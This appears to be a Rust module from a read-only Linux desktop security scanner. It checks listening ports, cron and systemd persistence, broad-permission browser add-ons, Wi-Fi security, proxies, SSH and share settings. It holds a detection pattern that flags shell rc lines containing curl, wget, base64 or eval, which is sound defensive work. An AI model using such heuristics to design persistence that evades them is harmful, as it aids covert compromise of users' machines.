//! Security review: report only, nothing is changed or removed. Parsers take text or paths so tests need no system.
//! Without root some things stay invisible (other users' sockets, `ufw` rules); the UI words it as "nothing visible".
use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
    time::{Duration, SystemTime},
};

use serde_json::Value;

use crate::{admin::Admin, apps::run, services::pkexec_output};

/// `code` picks the sentence in the UI: 0 port open to the network (`n` = pid of the owner), 1 outbound connections of a program,
/// 2 program from an unusual path, 3 `ld.so.preload`, 4 cron job, 5 user systemd unit, 6 `authorized_keys`,
/// 7 recently changed shell rc file, 8 browser extension with broad access, 9 failed logins, 10 firewall,
/// 11 restart needed (`subject` = packages, may be empty), 12 running kernel no longer installed (`subject` = version),
/// 13 updates waiting (`n` = count, `extra` = how many are security updates, empty for none), 14 held packages (`subject`),
/// 15 connected Wi-Fi with weak security (`subject` = name, `n` 0 open, 1 WEP, 2 WPA1), 16 saved open Wi-Fi that joins by
/// itself (`subject` = names), 17 system proxy (`subject` = setting, `n` 0 /etc/environment, 1 desktop),
/// 18 root certificates added by hand (`subject` = file names). Codes 19 to 22 (`level` -1) say the checks 15 to 18
/// ran and found nothing (19: `n` 3 secure Wi-Fi `subject`, 4 not on Wi-Fi). 23 SSH server allows passwords or root
/// login (`subject` = the settings), 25 `/etc/hosts` sends names to public addresses (`subject`); 24 and 26 are their
/// fine lines (24: `n` 0 server not running, 1 running and locked down). 27 one hardware address answers for several
/// addresses (`subject` = `mac = ip ip`), 29 Samba/NFS shares open to everyone (`subject`); 28 and 30 are their fine
/// lines (30: `n` 0 neither server runs, 1 running with nothing open).
/// `level`: 0 information, 1 worth a look, 2 suspicious.
#[derive(Debug, PartialEq)]
pub struct Finding {
    pub code: i32,
    pub level: i32,
    pub subject: String,
    pub extra: String,
    pub n: i32,
}

fn finding(code: i32, level: i32, subject: impl Into<String>, extra: impl Into<String>, n: usize) -> Finding {
    Finding {
        code,
        level,
        subject: subject.into(),
        extra: extra.into(),
        n: n as i32,
    }
}

pub struct Tool {
    pub name: &'static str,
    pub cmd: &'static str,
    pub installed: bool,
}

#[derive(Default)]
pub struct Scan {
    pub findings: Vec<Finding>,
    pub tools: Vec<Tool>,
}

const TOOLS: [(&str, &str); 6] = [
    ("rkhunter", "sudo apt install rkhunter && sudo rkhunter --check"),
    ("chkrootkit", "sudo apt install chkrootkit && sudo chkrootkit"),
    ("lynis", "sudo apt install lynis && sudo lynis audit system"),
    (
        "clamscan",
        "sudo apt install clamav && sudo freshclam && clamscan -ri ~",
    ),
    ("debsums", "sudo apt install debsums && sudo debsums -s"),
    ("aide", "sudo apt install aide && sudo aide --check"),
];

const RC_FILES: [&str; 4] = [".zshrc", ".bashrc", ".profile", ".xprofile"];
const RECENT: Duration = Duration::from_secs(30 * 24 * 3600);

/// Paths the scan reads, so tests can point them at a temp dir.
pub struct Roots {
    pub etc: PathBuf,
    pub home: PathBuf,
}

/// `admin` (one root run, see `admin.rs`) replaces the commands whose output is partial without root.
pub fn scan(admin: Option<&Admin>) -> Scan {
    let roots = Roots {
        etc: "/etc".into(),
        home: std::env::var("HOME").map(PathBuf::from).unwrap_or_default(),
    };
    let mut findings = parse_listening(&admin.map_or_else(|| run("ss", &["-tulnH", "-p"]), |a| a.listen.clone()));
    findings.extend(parse_connections(
        &admin.map_or_else(|| run("ss", &["-tnpH", "state", "established"]), |a| a.conn.clone()),
    ));
    findings.extend(unusual_processes(&roots.home, admin));
    findings.extend(persistence(&roots, &run("crontab", &["-l"])));
    findings.extend(extensions(&roots.home));
    findings.extend(network_findings());
    let failed = parse_failed_logins(&admin.map_or_else(
        || {
            run(
                "journalctl",
                &[
                    "--since",
                    "24 hours ago",
                    "-o",
                    "cat",
                    "--no-pager",
                    "-g",
                    "Failed password|authentication failure",
                ],
            )
        },
        |a| a.logins.clone(),
    ));
    if failed > 0 {
        findings.push(finding(9, 1, "", "", failed));
    }
    let conf = fs::read_to_string("/etc/ufw/ufw.conf").unwrap_or_default();
    if let Some(state) = ufw_problem(&conf, run("systemctl", &["is-active", "ufw"]).trim()) {
        findings.push(finding(10, 1, state, "", 0));
    }
    let kernel = run("uname", &["-r"]);
    let kernel = kernel.trim();
    let reboot = Path::new("/var/run/reboot-required");
    findings.extend(reboot_findings(
        reboot
            .exists()
            .then(|| fs::read_to_string("/var/run/reboot-required.pkgs").unwrap_or_default()),
        kernel,
        Path::new("/lib/modules").join(kernel).exists(),
    ));
    findings.extend(update_findings(
        &run("apt", &["list", "--upgradable"]),
        &run("apt-mark", &["showhold"]),
    ));
    // The firewall goes first among its level: it is one line, and 20 open ports would bury it.
    findings.sort_by_key(|f| (-f.level, f.code != 10, f.code));
    Scan {
        findings,
        tools: TOOLS
            .iter()
            .map(|&(name, cmd)| Tool {
                name,
                cmd,
                installed: ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"]
                    .iter()
                    .any(|d| Path::new(d).join(name).exists()),
            })
            .collect(),
    }
}

/// Why the firewall is off, `None` when it is on. `ufw disable` writes `ENABLED=no` to `ufw.conf` but leaves the
/// systemd service "active", so the service alone misses it. `ufw.conf` is world-readable, unlike the rules.
fn ufw_problem(conf: &str, service: &str) -> Option<String> {
    let enabled = conf.lines().any(|l| l.trim().eq_ignore_ascii_case("ENABLED=yes"));
    if !conf.is_empty() && !enabled {
        Some("disabled".into())
    } else if service != "active" {
        Some(service.into())
    } else {
        None
    }
}

fn is_loopback(addr: &str) -> bool {
    addr.starts_with("127.") || addr.starts_with("[::1]") || addr.starts_with("[::ffff:127.")
}

fn process_name(field: &str) -> &str {
    field
        .split("((\"")
        .nth(1)
        .and_then(|r| r.split('"').next())
        .unwrap_or("")
}

/// `ss -tulnH -p`: sockets that listen on every interface. IPv4 and IPv6 of the same port are one finding.
pub fn parse_listening(text: &str) -> Vec<Finding> {
    let mut seen = BTreeMap::new();
    for l in text.lines() {
        let f: Vec<&str> = l.split_whitespace().collect();
        let Some((host, port)) = f.get(4).and_then(|a| a.rsplit_once(':')) else {
            continue;
        };
        if matches!(host, "0.0.0.0" | "*" | "[::]" | "::") {
            seen.entry((f[0].to_string(), port.to_string()))
                .or_insert_with(|| f.get(6).map_or(("", 0), |p| (process_name(p), process_pid(p))));
        }
    }
    // One finding per program, listing its ports. `n` carries the pid (0 when `ss` could not say), so the app can
    // look up the real executable; every socket `ss` could not attribute lands in one nameless finding.
    // Key: (unnamed last, name, pid); value: (port number, protocol).
    type Ports<'a> = Vec<(u32, &'a str)>;
    let mut by_proc: BTreeMap<(bool, &str, usize), Ports> = BTreeMap::new();
    for ((proto, port), (proc, pid)) in &seen {
        by_proc
            .entry((proc.is_empty(), proc, *pid))
            .or_default()
            .push((port.parse().unwrap_or(0), proto));
    }
    by_proc
        .into_iter()
        .map(|((_, proc, pid), mut ports)| {
            ports.sort();
            let ports: Vec<String> = ports.iter().map(|(port, proto)| format!("{proto} {port}")).collect();
            finding(0, 1, ports.join(", "), proc, pid)
        })
        .collect()
}

/// Name to show for a process. Some programs keep their binary in a folder named after the program and call the file
/// by its version (Claude Code runs as `2.1.314`); then the folder is the name people know.
fn program_name(comm: &str, pid: usize) -> String {
    if !comm.starts_with(|c: char| c.is_ascii_digit()) {
        return comm.to_string();
    }
    name_from_path(comm, &exe_of(pid as i32))
}

fn name_from_path(comm: &str, exe: &str) -> String {
    exe.rsplit('/')
        .find(|c| !c.is_empty() && !c.starts_with(|c: char| c.is_ascii_digit()) && !matches!(*c, "versions" | "bin"))
        .unwrap_or(comm)
        .to_string()
}

fn process_pid(field: &str) -> usize {
    field
        .split("pid=")
        .nth(1)
        .and_then(|r| r.split(|c: char| !c.is_ascii_digit()).next())
        .and_then(|n| n.parse().ok())
        .unwrap_or(0)
}

/// Path of the program behind `pid`; empty when it is gone or belongs to another user (needs root).
pub fn exe_of(pid: i32) -> String {
    fs::read_link(format!("/proc/{pid}/exe")).map_or(String::new(), |p| p.to_string_lossy().into_owned())
}

/// `ss -tnpH state established`, grouped by program. The peer is the field before the `users:` one, which holds
/// whether or not this `ss` prints a State column.
pub fn parse_connections(text: &str) -> Vec<Finding> {
    let mut by_proc: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for l in text.lines() {
        let f: Vec<&str> = l.split_whitespace().collect();
        let Some(at) = f.iter().position(|w| w.starts_with("users:")) else {
            continue;
        };
        if at < 2 || is_loopback(f[at - 1]) {
            continue;
        }
        by_proc
            .entry(program_name(process_name(f[at]), process_pid(f[at])))
            .or_default()
            .push(f[at - 1].to_string());
    }
    by_proc
        .into_iter()
        .map(|(p, peers)| {
            let shown = peers.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
            finding(1, 0, p, shown, peers.len())
        })
        .collect()
}

/// Programs known to run from hidden or temporary folders; without this the list is mostly noise.
/// Matched from the start of the path (an AppImage mount, or a folder directly under home), never anywhere inside it:
/// anyone can create `/tmp/x/.cargo/`.
const KNOWN_GOOD_ROOT: [&str; 1] = ["/tmp/.mount_"]; // AppImage
const KNOWN_GOOD_HOME: [&str; 8] = [
    ".cache/gitstatus",
    ".vscode",
    ".dropbox-dist",
    ".claude",
    ".local/share/claude",
    ".gitkraken",
    ".cargo",
    ".rustup",
];

/// 2 for a program running from a temp folder, 1 for a deleted file or a hidden folder under home, else 0.
pub fn exe_level(exe: &str, home: &str) -> i32 {
    let under_home = |k: &&str| {
        !home.is_empty()
            && exe
                .strip_prefix(home)
                .is_some_and(|r| r.strip_prefix('/').is_some_and(|r| r.starts_with(*k)))
    };
    if KNOWN_GOOD_ROOT.iter().any(|k| exe.starts_with(k)) || KNOWN_GOOD_HOME.iter().any(under_home) {
        return 0;
    }
    if ["/tmp/", "/dev/shm/", "/var/tmp/"].iter().any(|p| exe.starts_with(p)) {
        return 2;
    }
    let hidden = exe
        .strip_prefix(home)
        .is_some_and(|r| !home.is_empty() && r.split('/').any(|c| c.starts_with('.') && c.len() > 1));
    // A deleted binary is mostly a package upgraded while the program ran; still worth a restart.
    if exe.ends_with(" (deleted)") || hidden { 1 } else { 0 }
}

fn unusual_processes(home: &Path, admin: Option<&Admin>) -> Vec<Finding> {
    let home = home.to_string_lossy();
    let mut by_exe: BTreeMap<String, (i32, String, usize)> = BTreeMap::new();
    let procs: Vec<(i32, String)> = admin.map_or_else(
        || {
            fs::read_dir("/proc")
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let pid = e.file_name().to_string_lossy().parse().ok()?;
                    // Other users' processes are unreadable without root; skipped.
                    let exe = fs::read_link(e.path().join("exe")).ok()?;
                    Some((pid, exe.to_string_lossy().into_owned()))
                })
                .collect()
        },
        |a| a.procs.clone(),
    );
    for (pid, exe) in procs {
        let level = exe_level(&exe, &home);
        if level > 0 {
            let comm = fs::read_to_string(format!("/proc/{pid}/comm")).unwrap_or_default();
            by_exe.entry(exe).or_insert((level, comm.trim().to_string(), 0)).2 += 1;
        }
    }
    by_exe
        .into_iter()
        .map(|(exe, (level, comm, n))| finding(2, level, exe, comm, n))
        .collect()
}

fn recent(p: &Path) -> bool {
    fs::metadata(p)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| SystemTime::now().duration_since(t).ok())
        .is_some_and(|age| age < RECENT)
}

/// Lines that download or decode something from a shell startup file. `eval "$(tool init)"` is normal and skipped.
pub fn suspicious_rc_lines(text: &str) -> Vec<&str> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#'))
        .filter(|l| {
            ["curl", "wget", "base64"].iter().any(|k| l.contains(k))
                || (l.contains("eval ") && !l.contains("eval \"$(") && !l.contains("eval $("))
        })
        .collect()
}

fn persistence(r: &Roots, crontab: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let preload = fs::read_to_string(r.etc.join("ld.so.preload")).unwrap_or_default();
    if let Some(l) = preload
        .lines()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with('#'))
    {
        out.push(finding(3, 2, l, "", 0));
    }
    for l in crontab
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
    {
        out.push(finding(4, 1, l, "", 0));
    }
    for e in fs::read_dir(r.etc.join("cron.d")).into_iter().flatten().flatten() {
        if recent(&e.path()) {
            out.push(finding(4, 1, e.path().to_string_lossy(), "", 0));
        }
    }
    for e in fs::read_dir(r.home.join(".config/systemd/user"))
        .into_iter()
        .flatten()
        .flatten()
    {
        let name = e.file_name().to_string_lossy().into_owned();
        if name.ends_with(".service") || name.ends_with(".timer") {
            out.push(finding(5, 1, name, "", 0));
        }
    }
    // Only a key count and the age: the keys themselves are never read into a finding.
    let keys = r.home.join(".ssh/authorized_keys");
    let n = fs::read_to_string(&keys)
        .map(|t| {
            t.lines()
                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                .count()
        })
        .unwrap_or(0);
    if n > 0 {
        let extra = if recent(&keys) { "recent" } else { "" };
        out.push(finding(6, 1, keys.to_string_lossy(), extra, n));
    }
    for name in RC_FILES {
        let p = r.home.join(name);
        if !recent(&p) {
            continue;
        }
        let text = fs::read_to_string(&p).unwrap_or_default();
        let bad = suspicious_rc_lines(&text);
        if let Some(first) = bad.first() {
            out.push(finding(
                7,
                1,
                p.to_string_lossy(),
                first.chars().take(100).collect::<String>(),
                bad.len(),
            ));
        }
    }
    out
}

/// Chrome built-in apps (Docs, Slides, Sheets, Drive, Gmail, YouTube...) that sit in the profile but are not add-ons.
const GOOGLE_IDS: [&str; 8] = [
    "aohghmighlieiainnegkcijnilnrhdmn",
    "aapocclcgogkmnckokdopfmhonfmgoek",
    "felcaaldnbdncclmgdcncolpebgiejap",
    "apdfllckaahabafndbhieahigkjlhalf",
    "pjkljhegncpnkpknbcohdijeoejaedia",
    "blpcfgokakmgnkcojhhkbfbldkacnbeo",
    "ghbmnnjooekpmoecnnnilnnbdlolhkhi",
    "nmmhkkegccagdldgiimedpiccmgmieda",
];

/// Permissions that let an add-on read every page or your browsing data.
pub fn broad<'a>(perms: impl Iterator<Item = &'a str>) -> Vec<String> {
    let mut out: Vec<String> = perms
        .filter(|p| {
            matches!(
                *p,
                "<all_urls>"
                    | "*://*/*"
                    | "http://*/*"
                    | "https://*/*"
                    | "webRequest"
                    | "cookies"
                    | "history"
                    | "nativeMessaging"
            )
        })
        .map(String::from)
        .collect();
    out.sort();
    out.dedup();
    out
}

fn strings<'a>(v: &'a Value, key: &str) -> impl Iterator<Item = &'a str> {
    v.get(key)
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
}

/// Chrome `manifest.json`; `messages` is `_locales/<default_locale>/messages.json`, for names like `__MSG_appName__`.
pub fn parse_manifest(manifest: &str, messages: Option<&str>) -> Option<(String, Vec<String>)> {
    let m: Value = serde_json::from_str(manifest).ok()?;
    let mut name = m.get("name")?.as_str()?.to_string();
    if let Some(key) = name.strip_prefix("__MSG_").and_then(|k| k.strip_suffix("__")) {
        // Chrome message keys are case-insensitive. A name that cannot be looked up stays as the raw placeholder: the
        // add-on's powers must be listed anyway, or one could hide itself by pointing at a message that is not there.
        let looked_up = messages
            .and_then(|t| serde_json::from_str::<Value>(t).ok())
            .and_then(|msgs| {
                msgs.as_object()?
                    .iter()
                    .find(|(k, _)| k.eq_ignore_ascii_case(key))
                    .and_then(|(_, v)| v.get("message")?.as_str())
                    .map(String::from)
            });
        name = looked_up.unwrap_or(name);
    }
    let perms = strings(&m, "permissions").chain(strings(&m, "host_permissions"));
    Some((name, broad(perms)))
}

/// Firefox `extensions.json`: add-ons the user installed, with the permissions they asked for.
pub fn parse_firefox(text: &str) -> Vec<(String, Vec<String>)> {
    let Ok(v) = serde_json::from_str::<Value>(text) else {
        return Vec::new();
    };
    v.get("addons")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|a| a.get("type").and_then(Value::as_str) == Some("extension"))
        .filter(|a| a.get("active").and_then(Value::as_bool) == Some(true))
        .filter(|a| {
            let loc = a.get("location").and_then(Value::as_str).unwrap_or("");
            !loc.starts_with("app-system") && !loc.starts_with("app-builtin")
        })
        .filter_map(|a| {
            let name = a.pointer("/defaultLocale/name")?.as_str()?.to_string();
            let p = a.get("userPermissions")?;
            Some((name, broad(strings(p, "permissions").chain(strings(p, "origins")))))
        })
        .collect()
}

/// Browsers whose add-ons are read: (profile folder under `$HOME`, name, icon theme name). The index is the `n` of a
/// code 8 finding; Firefox is last.
pub const BROWSERS: [(&str, &str, &str); 4] = [
    (".config/google-chrome", "Google Chrome", "google-chrome"),
    (".config/chromium", "Chromium", "chromium"),
    (".config/BraveSoftware/Brave-Browser", "Brave", "brave-browser"),
    (".mozilla/firefox", "Firefox", "firefox"),
];

fn extensions(home: &Path) -> Vec<Finding> {
    let mut found = Vec::new();
    for (bi, (b, _, _)) in BROWSERS[..3].iter().enumerate() {
        for profile in fs::read_dir(home.join(b)).into_iter().flatten().flatten() {
            for ext in fs::read_dir(profile.path().join("Extensions"))
                .into_iter()
                .flatten()
                .flatten()
            {
                if GOOGLE_IDS.contains(&ext.file_name().to_string_lossy().as_ref()) {
                    continue;
                }
                // Several versions can sit side by side; the highest name is the one in use.
                let Some(ver) = fs::read_dir(ext.path())
                    .into_iter()
                    .flatten()
                    .flatten()
                    .map(|v| v.path())
                    .max()
                else {
                    continue;
                };
                let Ok(text) = fs::read_to_string(ver.join("manifest.json")) else {
                    continue;
                };
                let locale = serde_json::from_str::<Value>(&text)
                    .ok()
                    .and_then(|m| m.get("default_locale")?.as_str().map(String::from))
                    // The add-on writes this file, so it must not name a folder outside its own `_locales`.
                    .filter(|l| crate::apps::plain(l))
                    .unwrap_or_else(|| "en".into());
                let msgs = fs::read_to_string(ver.join("_locales").join(locale).join("messages.json")).ok();
                found.extend(parse_manifest(&text, msgs.as_deref()).map(|e| (bi, e)));
            }
        }
    }
    for profile in fs::read_dir(home.join(BROWSERS[3].0)).into_iter().flatten().flatten() {
        if let Ok(t) = fs::read_to_string(profile.path().join("extensions.json")) {
            found.extend(parse_firefox(&t).into_iter().map(|e| (3, e)));
        }
    }
    found
        .into_iter()
        .filter(|(_, (_, p))| !p.is_empty())
        .map(|(bi, (name, p))| finding(8, 1, name, p.join(", "), bi))
        .collect()
}

/// `ufw status verbose` through pkexec (asks for the administrator password). Only reads; ufw prints its own error
/// when it is not installed, which is passed on as the error text.
pub fn firewall_rules() -> std::io::Result<String> {
    let out = pkexec_output("/usr/sbin/ufw", &["status", "verbose"])?;
    let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if text.is_empty() {
        return Err(std::io::Error::other(
            String::from_utf8_lossy(&out.stderr).trim().to_string() + " (is ufw installed?)",
        ));
    }
    Ok(text)
}

pub fn parse_failed_logins(text: &str) -> usize {
    text.lines()
        .filter(|l| l.contains("Failed password") || l.contains("authentication failure"))
        .count()
}

/// Splits one line of `nmcli -t`, where `:` inside a value is written `\:`.
fn split_terse(line: &str) -> Vec<String> {
    let (mut out, mut cur, mut esc) = (Vec::new(), String::new(), false);
    for c in line.chars() {
        match (esc, c) {
            (false, '\\') => esc = true,
            (false, ':') => out.push(std::mem::take(&mut cur)),
            _ => {
                cur.push(c);
                esc = false;
            }
        }
    }
    out.push(cur);
    out
}

/// The connected Wi-Fi from `nmcli -t -f ACTIVE,SSID,SECURITY dev wifi` when it is open (`n` 0), WEP (1) or WPA1 only (2).
fn wifi_findings(text: &str) -> Vec<Finding> {
    text.lines()
        .map(split_terse)
        .filter(|f| f.len() == 3 && f[0] == "yes")
        .filter_map(|f| {
            let sec = f[2].trim();
            let (n, level) = if sec.is_empty() || sec == "--" {
                (0, 2)
            } else if sec.contains("WEP") {
                (1, 2)
            } else if sec.contains("WPA1") && !sec.contains("WPA2") && !sec.contains("WPA3") {
                (2, 1)
            } else {
                return None;
            };
            Some(finding(15, level, f[1].clone(), "", n))
        })
        .collect()
}

/// Saved Wi-Fi profiles that join by themselves without a password: any open hotspot with the same name connects
/// (evil twin). `key_mgmt` reads `802-11-wireless-security.key-mgmt` of a profile; empty means no security.
fn open_autoconnect(list: &str, key_mgmt: impl Fn(&str) -> String) -> Option<Finding> {
    let names: Vec<String> = list
        .lines()
        .map(split_terse)
        .filter(|f| f.len() == 3 && f[1] == "802-11-wireless" && f[2] == "yes")
        .map(|f| f[0].clone())
        .filter(|n| key_mgmt(n).trim().is_empty())
        .collect();
    (!names.is_empty()).then(|| finding(16, 1, names.join(", "), "", names.len()))
}

/// Proxies set for the whole system: `*_proxy=` lines of `/etc/environment` (`n` 0) and the GNOME proxy mode (1).
/// A hijacked proxy sees all web traffic, so it is worth a look even when it is yours.
fn proxy_findings(environment: &str, gnome_mode: &str) -> Vec<Finding> {
    let mut out: Vec<Finding> = environment
        .lines()
        .map(|l| l.trim().trim_start_matches("export ").trim())
        .filter(|l| {
            let key = l.split('=').next().unwrap_or("").to_ascii_lowercase();
            l.contains('=') && ["http_proxy", "https_proxy", "ftp_proxy", "all_proxy"].contains(&key.as_str())
        })
        .map(|l| finding(17, 1, l, "", 0))
        .collect();
    let mode = gnome_mode.trim().trim_matches('\'');
    if !mode.is_empty() && mode != "none" {
        out.push(finding(17, 1, mode, "", 1));
    }
    out
}

/// Certificates added by hand to the system store: whoever holds the key behind one can read HTTPS traffic.
fn extra_certs(dir: &Path) -> Option<Finding> {
    let mut names: Vec<String> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .filter(|n| n.ends_with(".crt"))
        .collect();
    names.sort_unstable();
    (!names.is_empty()).then(|| finding(18, 1, names.join(", "), "", names.len()))
}

/// What `wifi_findings` found fine, so the page can say the check ran: the secure network in use (`n` 3) or no Wi-Fi
/// in use (4). `None` when `nmcli` printed nothing (not installed or no Wi-Fi card): nothing was checked.
fn wifi_ok(text: &str) -> Option<Finding> {
    let active = text.lines().map(split_terse).find(|f| f.len() == 3 && f[0] == "yes");
    match active {
        Some(f) => Some(finding(19, -1, f[1].clone(), "", 3)),
        None => (!text.trim().is_empty()).then(|| finding(19, -1, "", "", 4)),
    }
}

/// Level -1 findings mean "checked and fine": the page lists them last with a tick, the counts leave them out.
fn network_findings() -> Vec<Finding> {
    let wifi = run("nmcli", &["-t", "-f", "ACTIVE,SSID,SECURITY", "dev", "wifi"]);
    let mut out = wifi_findings(&wifi);
    if out.is_empty() {
        out.extend(wifi_ok(&wifi));
    }
    let profiles = run("nmcli", &["-t", "-f", "NAME,TYPE,AUTOCONNECT", "con", "show"]);
    match open_autoconnect(&profiles, |n| {
        run("nmcli", &["-g", "802-11-wireless-security.key-mgmt", "con", "show", n])
    }) {
        Some(f) => out.push(f),
        None if !profiles.trim().is_empty() => out.push(finding(20, -1, "", "", 0)),
        None => {}
    }
    let proxies = proxy_findings(
        &fs::read_to_string("/etc/environment").unwrap_or_default(),
        &run("gsettings", &["get", "org.gnome.system.proxy", "mode"]),
    );
    out.extend(if proxies.is_empty() {
        vec![finding(21, -1, "", "", 2)]
    } else {
        proxies
    });
    out.push(extra_certs(Path::new("/usr/local/share/ca-certificates")).unwrap_or_else(|| finding(22, -1, "", "", 0)));
    out.push(hosts_finding(&fs::read_to_string("/etc/hosts").unwrap_or_default()));
    out.push(sshd_finding(
        run("systemctl", &["is-active", "ssh", "sshd"])
            .lines()
            .any(|l| l.trim() == "active"),
        &sshd_configs(Path::new("/etc/ssh")),
    ));
    out.push(arp_finding(&crate::lan::parse_neigh(&run("ip", &["-4", "neigh"]))));
    let active = |unit: &str| run("systemctl", &["is-active", unit]).trim() == "active";
    out.push(shares_finding(
        active("smbd").then(|| fs::read_to_string("/etc/samba/smb.conf").unwrap_or_default()),
        active("nfs-server").then(|| fs::read_to_string("/etc/exports").unwrap_or_default()),
    ));
    out
}

/// One hardware address answering for several addresses on the LAN: a router can do it (proxy ARP), and so can
/// someone posing as it (ARP spoofing). Only a hint, so level 1. 28 is the fine line.
fn arp_finding(neigh: &[(std::net::Ipv4Addr, String)]) -> Finding {
    let mut by_mac: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for (ip, mac) in neigh {
        by_mac.entry(mac.to_ascii_lowercase()).or_default().push(ip.to_string());
    }
    let dup: Vec<String> = by_mac
        .into_iter()
        .filter(|(_, ips)| ips.len() > 1)
        .map(|(mac, ips)| format!("{mac} = {}", ips.join(" ")))
        .collect();
    if dup.is_empty() {
        finding(28, -1, "", "", 0)
    } else {
        finding(27, 1, dup.join("; "), "", dup.len())
    }
}

/// Samba share names open to guests (`guest ok`/`public` = yes): no password needed.
fn samba_open_shares(conf: &str) -> Vec<String> {
    let (mut section, mut out) = (String::new(), Vec::<String>::new());
    for line in conf.lines() {
        let l = line.split(['#', ';']).next().unwrap_or("").trim();
        if let Some(name) = l.strip_prefix('[').and_then(|r| r.strip_suffix(']')) {
            section = name.trim().to_string();
        } else if let Some((k, v)) = l.split_once('=') {
            let key = k.split_whitespace().collect::<Vec<_>>().join(" ").to_ascii_lowercase();
            let on = matches!(v.trim().to_ascii_lowercase().as_str(), "yes" | "true" | "1");
            let special = ["global", "printers", "print$"].contains(&section.to_ascii_lowercase().as_str());
            if on && ["guest ok", "public"].contains(&key.as_str()) && !special && !out.contains(&section) {
                out.push(section.clone());
            }
        }
    }
    out
}

/// NFS exports offered to every host (`*` or no client list).
fn nfs_open_exports(text: &str) -> Vec<String> {
    text.lines()
        .filter_map(|l| {
            let mut w = l.split('#').next().unwrap_or("").split_whitespace();
            let path = w.next()?;
            let mut clients = w.peekable();
            (clients.peek().is_none() || clients.any(|c| c.starts_with('*') || c.starts_with('(')))
                .then(|| path.to_string())
        })
        .collect()
}

/// `smb`/`nfs`: the config text when that server runs, `None` when it does not. 30 is the fine line (`n` 0 neither
/// runs, 1 nothing open to everyone).
fn shares_finding(smb: Option<String>, nfs: Option<String>) -> Finding {
    let mut parts = Vec::new();
    if let Some(c) = &smb {
        let s = samba_open_shares(c);
        if !s.is_empty() {
            parts.push(format!("Samba: {}", s.join(", ")));
        }
    }
    if let Some(c) = &nfs {
        let s = nfs_open_exports(c);
        if !s.is_empty() {
            parts.push(format!("NFS: {}", s.join(", ")));
        }
    }
    if !parts.is_empty() {
        finding(29, 1, parts.join("; "), "", 0)
    } else {
        finding(30, -1, "", "", usize::from(smb.is_some() || nfs.is_some()))
    }
}

/// The SSH server settings in the order sshd reads them. shortcut: assumes the stock `Include sshd_config.d/*.conf`
/// at the top of `sshd_config` (Debian/Ubuntu), so drop-ins come first; upgrade by following `Include` if that breaks.
fn sshd_configs(dir: &Path) -> Vec<String> {
    let mut drop_ins: Vec<PathBuf> = fs::read_dir(dir.join("sshd_config.d"))
        .into_iter()
        .flatten()
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|x| x == "conf"))
        .collect();
    drop_ins.sort();
    drop_ins.push(dir.join("sshd_config"));
    drop_ins.iter().filter_map(|p| fs::read_to_string(p).ok()).collect()
}

/// Password or root login over SSH, only when the server runs (`n` 0 of the fine line: not running). sshd keeps the
/// first value of a keyword, and passwords are allowed unless turned off. shortcut: `Match` blocks are not read.
fn sshd_finding(running: bool, configs: &[String]) -> Finding {
    if !running {
        return finding(24, -1, "", "", 0);
    }
    let first = |key: &str| {
        configs.iter().find_map(|c| {
            c.lines()
                .map(str::trim)
                .take_while(|l| !l.to_ascii_lowercase().starts_with("match "))
                .find_map(|l| {
                    let mut w = l.split_whitespace();
                    w.next()
                        .filter(|k| k.eq_ignore_ascii_case(key))
                        .and_then(|_| w.next())
                        .map(str::to_ascii_lowercase)
                })
        })
    };
    let mut bad = Vec::new();
    if first("PasswordAuthentication").is_none_or(|v| v != "no") {
        bad.push("PasswordAuthentication yes");
    }
    if first("PermitRootLogin").is_some_and(|v| v == "yes") {
        bad.push("PermitRootLogin yes");
    }
    if bad.is_empty() {
        finding(24, -1, "", "", 1)
    } else {
        finding(23, 1, bad.join(", "), "", 0)
    }
}

/// `/etc/hosts` lines that send a name to a public address: a way to redirect a site (a LAN or loopback address is
/// normal, and ad-block lists use 0.0.0.0).
fn hosts_finding(text: &str) -> Finding {
    let public = |ip: std::net::IpAddr| match ip {
        std::net::IpAddr::V4(a) => !(a.is_loopback() || a.is_unspecified() || a.is_private() || a.is_link_local()),
        std::net::IpAddr::V6(a) => {
            !(a.is_loopback()
                || a.is_unspecified()
                || a.is_multicast()
                || a.segments()[0] & 0xfe00 == 0xfc00
                // fe00::/8 holds link-local (fe80::/10) and Debian's stock `fe00::0 ip6-localnet`
                || a.segments()[0] & 0xff00 == 0xfe00)
        }
    };
    let found: Vec<String> = text
        .lines()
        .map(|l| l.split('#').next().unwrap_or("").trim())
        .filter_map(|l| {
            let mut w = l.split_whitespace();
            let ip = w.next()?;
            let names: Vec<&str> = w.collect();
            (!names.is_empty() && ip.parse().is_ok_and(public)).then(|| format!("{ip} {}", names.join(" ")))
        })
        .collect();
    if found.is_empty() {
        finding(26, -1, "", "", 0)
    } else {
        finding(25, 1, found.join(", "), "", found.len())
    }
}

/// `pkgs` is the text of `reboot-required.pkgs` when `/var/run/reboot-required` exists, `None` otherwise.
/// A missing `/lib/modules/<running kernel>` means the kernel was replaced while it kept running.
fn reboot_findings(pkgs: Option<String>, kernel: &str, modules_exist: bool) -> Vec<Finding> {
    let mut out = Vec::new();
    if let Some(p) = pkgs {
        let mut names: Vec<&str> = p.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
        names.sort_unstable();
        names.dedup();
        out.push(finding(11, 1, names.join(", "), "", 0));
    }
    if !kernel.is_empty() && !modules_exist {
        out.push(finding(12, 1, kernel, "", 0));
    }
    out
}

/// Waiting updates from `apt list --upgradable` (the local package list, no network) and held packages from
/// `apt-mark showhold`. Security updates are the ones from a `-security` pocket.
